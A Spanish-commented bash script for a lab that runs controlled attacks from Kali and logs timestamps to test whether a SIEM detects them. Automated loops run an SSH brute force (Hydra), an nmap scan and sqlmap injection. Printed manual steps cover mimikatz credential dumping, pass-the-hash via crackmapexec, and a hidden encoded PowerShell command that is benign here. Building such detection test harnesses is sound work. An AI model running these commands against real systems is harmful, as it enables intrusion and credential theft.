#!/usr/bin/env bash
# =============================================================================
# escenario2_ataques.sh — ESCENARIO 2: Ataques controlados
#
# DÓNDE EJECUTAR: en la VM KALI LINUX (192.168.30.20)
#   vagrant ssh kali  →  sudo bash /vagrant/Lab/escenario2_ataques.sh
#
# QUÉ HACE: ejecuta los 5 tipos de ataque definidos en la metodología,
#            5 repeticiones cada uno, registrando timestamps en CSV para
#            correlacionar luego con las alertas del SIEM.
#
# OBJETIVOS (ajustar si las IPs cambian):
#   SSH brute-force  → web-server   (192.168.10.10)
#   Port scan        → dc-empresa   (192.168.10.20)
#   SQL injection    → web-server   (http://192.168.10.10/login.html?user=1)
#   Pass-the-Hash    → manual (ver instrucciones al final)
#   Payload exec     → manual (ver instrucciones al final)
#
# USO:
#   sudo bash escenario2_ataques.sh
# =============================================================================
set -uo pipefail

SSH_TARGET="192.168.10.10"
SSH_USER="vagrant"
SCAN_TARGET="192.168.10.0/24"
WEB_URL="http://192.168.10.10/login.html?user=1"
REPETICIONES=5

LOG_CSV="/tmp/log_ataques.csv"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${CYAN}[$(date '+%H:%M:%S')]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC}   $*"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $*"; }

# Inicializar CSV
echo "ataque,mitre_id,target_ip,inicio,fin,repeticion" > "$LOG_CSV"

log_ataque() {
    local ataque="$1" mitre="$2" target="$3" inicio="$4" fin="$5" rep="$6"
    echo "${ataque},${mitre},${target},${inicio},${fin},${rep}" >> "$LOG_CSV"
}

echo ""
echo "════════════════════════════════════════════════════════════"
echo "  ESCENARIO 2 — Ataques controlados (5 tipos × 5 reps)"
echo "  Kali: $(hostname -I | awk '{print $1}')"
echo "  Log : ${LOG_CSV}"
echo "  Inicio: $(date)"
echo "════════════════════════════════════════════════════════════"
echo ""

# Verificar herramientas necesarias
HERRAMIENTAS_OK=true
for tool in hydra nmap sqlmap; do
    if command -v "$tool" &>/dev/null; then
        ok "$tool disponible"
    else
        warn "$tool NO disponible — instalar con: sudo apt-get install -y $tool"
        HERRAMIENTAS_OK=false
    fi
done

if [[ "$HERRAMIENTAS_OK" == "false" ]]; then
    warn "Instalando herramientas faltantes..."
    sudo apt-get update -qq
    sudo apt-get install -y -qq hydra nmap sqlmap 2>/dev/null || true
fi

# Wordlist mínima para pruebas (si no hay rockyou)
WORDLIST="/usr/share/wordlists/rockyou.txt"
if [[ ! -f "$WORDLIST" ]]; then
    WORDLIST="/tmp/wordlist_lab.txt"
    printf "123456\npassword\nvagrant\nadmin\nletmein\nqwerty\nP@ssw0rd\nroot\n" > "$WORDLIST"
    info "Wordlist mínima creada en $WORDLIST"
fi

echo ""
echo "════════════════════════════════════════════════════════════"
info "ATAQUE 1 — Fuerza bruta SSH (T1110.001) contra ${SSH_TARGET}"
echo "════════════════════════════════════════════════════════════"

for i in $(seq 1 "$REPETICIONES"); do
    info "Rep ${i}/${REPETICIONES}..."
    INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    hydra -l "${SSH_USER}" -P "${WORDLIST}" -t 4 -f \
        "ssh://${SSH_TARGET}" \
        -o "/tmp/hydra_rep${i}.log" 2>/dev/null || true
    FIN=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    log_ataque "bruteforce_ssh" "T1110.001" "${SSH_TARGET}" "${INICIO}" "${FIN}" "${i}"
    ok "Rep ${i} completada. Pausa 10s..."
    sleep 10
done

echo ""
echo "════════════════════════════════════════════════════════════"
info "ATAQUE 2 — Escaneo de puertos (T1046) contra ${SCAN_TARGET}"
echo "════════════════════════════════════════════════════════════"

for i in $(seq 1 "$REPETICIONES"); do
    info "Rep ${i}/${REPETICIONES}..."
    INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    nmap -sS -T4 --top-ports 1000 "${SCAN_TARGET}" \
        -oN "/tmp/nmap_rep${i}.log" 2>/dev/null || true
    FIN=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    log_ataque "portscan" "T1046" "${SCAN_TARGET}" "${INICIO}" "${FIN}" "${i}"
    ok "Rep ${i} completada. Pausa 15s..."
    sleep 15
done

echo ""
echo "════════════════════════════════════════════════════════════"
info "ATAQUE 3 — Inyección SQL (T1190) contra ${WEB_URL}"
echo "════════════════════════════════════════════════════════════"

for i in $(seq 1 "$REPETICIONES"); do
    info "Rep ${i}/${REPETICIONES}..."
    INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    sqlmap -u "${WEB_URL}" --batch --level=2 --risk=1 \
        --random-agent --forms \
        --output-dir="/tmp/sqlmap_rep${i}" 2>/dev/null || true
    FIN=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    log_ataque "sql_injection" "T1190" "${SSH_TARGET}" "${INICIO}" "${FIN}" "${i}"
    ok "Rep ${i} completada. Pausa 10s..."
    sleep 10
done

echo ""
echo "════════════════════════════════════════════════════════════"
echo -e "${YELLOW}  ATAQUES 4 y 5 — Requieren pasos manuales:${NC}"
echo ""
echo "  ATAQUE 4 — Pass-the-Hash (T1550.002)"
echo "    Requiere un hash NTLM real del DC (192.168.10.20)."
echo "    En el DC (vía RDP o consola):"
echo "      1. Abrir mimikatz.exe como SYSTEM"
echo "      2. privilege::debug"
echo "      3. sekurlsa::logonpasswords"
echo "      4. Copiar el hash NT del usuario Administrator"
echo "    Luego en Kali:"
echo "      INICIO=\$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")"
echo "      crackmapexec smb 192.168.10.20 -u Administrator -H <HASH_NT>"
echo "      FIN=\$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")"
echo "      echo \"pass_the_hash,T1550.002,192.168.10.20,\$INICIO,\$FIN,1\" >> ${LOG_CSV}"
echo ""
echo "  ATAQUE 5 — Ejecución de Payload (T1059.001)"
echo "    Abre una sesión RDP al Windows (192.168.20.x)."
echo "    Ejecuta en PowerShell:"
echo "      \$INICIO = Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ'"
echo "      powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQA="
echo "      \$FIN = Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ'"
echo "    Luego en Kali agrega la línea al CSV:"
echo "      echo \"payload_execution,T1059.001,192.168.20.x,\$INICIO,\$FIN,1\" >> ${LOG_CSV}"
echo "════════════════════════════════════════════════════════════"

FIN_TOTAL=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

echo ""
echo "════════════════════════════════════════════════════════════"
ok "ESCENARIO 2 completado (ataques 1-3 automáticos)."
echo ""
echo "  Log de ataques: ${LOG_CSV}"
echo "  $(wc -l < "$LOG_CSV") entradas registradas (incluyendo cabecera)"
echo ""
echo "  SIGUIENTE PASO:"
echo "  Copiar ${LOG_CSV} al SIEM y ejecutar el análisis:"
echo "    scp ${LOG_CSV} vagrant@192.168.30.10:/tmp/"
echo "    (o copiar manualmente)"
echo "════════════════════════════════════════════════════════════"
